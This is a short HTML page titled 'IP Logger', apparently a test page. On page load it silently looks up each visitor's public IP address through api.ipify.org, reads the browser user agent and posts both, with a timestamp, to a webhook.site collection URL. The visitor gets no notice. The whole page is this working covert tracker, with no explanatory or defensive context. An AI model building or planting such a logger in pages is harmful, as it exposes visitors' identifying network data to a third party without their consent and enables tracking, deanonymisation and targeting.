<!DOCTYPE html>
<html>
<head>
  <title>IP Logger</title>
  <script>
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        const ua = navigator.userAgent;

        fetch("https://webhook.site/xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            ip: ip,
            userAgent: ua,
            timestamp: new Date().toISOString()
          })
        });
      });
  </script>
</head>
<body>
  <h1>Testing IP Logger</h1>
</body>
</html>
